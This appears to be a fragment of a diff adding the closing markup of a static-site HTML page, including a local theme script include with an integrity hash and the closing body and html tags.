+    </main>
+
+    
+      
+      <script src="/js/coder.min.8fb86376a16e684af472a329aef502dbebcfab65ce264e9750d144912947c602.js" integrity="sha256-j7hjdqFuaEr0cqMprvUC2&#43;vPq2XOJk6XUNFEkSlHxgI="></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
